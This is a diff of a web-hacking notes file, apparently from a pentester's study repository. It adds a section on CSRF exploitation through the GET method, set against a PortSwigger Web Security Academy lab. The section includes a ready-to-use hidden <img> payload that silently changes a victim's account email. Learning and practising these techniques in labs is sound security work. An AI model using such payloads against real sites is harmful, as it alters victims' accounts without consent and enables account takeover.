@@ -31,7 +31,16 @@ document.forms[0].submit();
 
 
 
+## Basic CSRF via GET method EXPLOITATION:
+- First, we capture the POST method of the parameter we want to change to our target. We have to **change the request methods** as follows:<br />
+![4](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/fff805bc-400f-4bd0-a4a0-bc8975de4e4c)
 
 
 
-In the next example we are going to tr
+- Finally we can take the GET URL, changing the way we want to make all the changes we want to do in the victim, and finally delivered it, in this case as a <img>:<br />
+
+  ```html
+  <img src="https://0aef003d03e974bd832f197c007b0012.web-security-academy.net/my-account/change-email?email=changingEmail%40gmail.com" width="1" height="1" alt="Message"/>
+  ```
+
+
